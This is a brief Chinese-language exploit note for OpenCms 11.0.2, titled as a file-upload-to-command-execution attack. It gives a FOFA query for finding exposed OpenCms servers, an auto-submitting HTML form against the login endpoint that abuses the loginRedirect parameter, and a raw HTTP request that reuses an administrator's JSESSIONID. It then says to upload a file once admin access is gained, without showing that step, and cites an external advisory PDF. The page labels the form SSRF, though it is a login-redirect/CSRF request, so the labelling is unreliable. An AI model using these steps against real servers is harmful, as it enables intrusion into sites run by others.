# OpenCMS 11.0.2 文件上传到命令执行


FOFA：

```
app="OpenCms/"
```
文件上传需要获取管理员的JSESSIONID或者账号密码。

SSRF Exploit.html：


```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://vulnerablehost.com/system/login" method="POST">
      <input type="hidden" name="ocUname" value="anything" />
      <input type="hidden" name="ocPword" value="anything" />
      <input type="hidden" name="loginRedirect" value="https://google.com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

重定向：


```
GET /system/login?loginRedirect=https://google.com HTTP/1.1
Host: vulnerablehost.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://vulnerablehost.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://vulnerablehost.com/system/login
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=Valid JSESSIONID authenticated cookie
```

获取到管理员权限后进行上传文件。

详情可参考：https://dl.packetstormsecurity.net/2103-exploits/opencms1102-exec.pdf